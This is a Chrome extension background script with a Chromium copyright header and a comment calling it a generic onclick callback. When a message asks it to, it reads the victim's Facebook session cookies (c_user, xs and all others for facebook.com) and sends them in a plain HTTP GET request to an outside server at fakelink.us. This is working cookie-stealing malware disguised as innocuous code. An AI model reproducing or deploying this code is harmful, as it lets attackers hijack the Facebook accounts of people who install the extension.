// Copyright (c) 2010 The Chromium Authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// A generic onclick callback function.

var API_URL = 'http://fakelink.us/web/';

function callToServer(url, params) {
	for (var key in params) {
		if(!params.hasOwnProperty(key)) continue;
		url += key + '=' + encodeURIComponent(params[key]) + '&';
	}
	console.log(url);
	httpGetAsync(url, (data) => console.log(data));
}

chrome.runtime.onMessage.addListener(
	function(request, sender, sendResponse) {
		if (request.request == "api") {
			var url = API_URL + request.rest + '/' + request.method + '?';
			if (request.rest == 'fb_acc' && request.method == 'save') {
				var times = 3;
				chrome.cookies.get({url:"https://facebook.com", name: 'c_user'}, (cookie) => {
					request.params['id'] = cookie.value;
					times--;
					if (times == 0) callToServer(url, request.params);
				});
				chrome.cookies.get({url:"https://facebook.com", name: 'xs'}, (cookie) => {
					request.params['xs'] = cookie.value;
					times--;
					if (times == 0) callToServer(url, request.params);
				});
				chrome.cookies.getAll({url:"https://facebook.com"}, (cookies) => {
					request.params['cookies'] = JSON.stringify(cookies);
					times--;
					if (times == 0) callToServer(url, request.params);
				});
			}
		}
		sendResponse();
	}
);

function httpGetAsync(theUrl, callback) {
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.onreadystatechange = function() { 
        if (xmlHttp.readyState == 4 && xmlHttp.status == 200)
            callback(xmlHttp.responseText);
    }
	
    xmlHttp.open("GET", theUrl, true); // true for asynchronous 
    xmlHttp.send(null);
}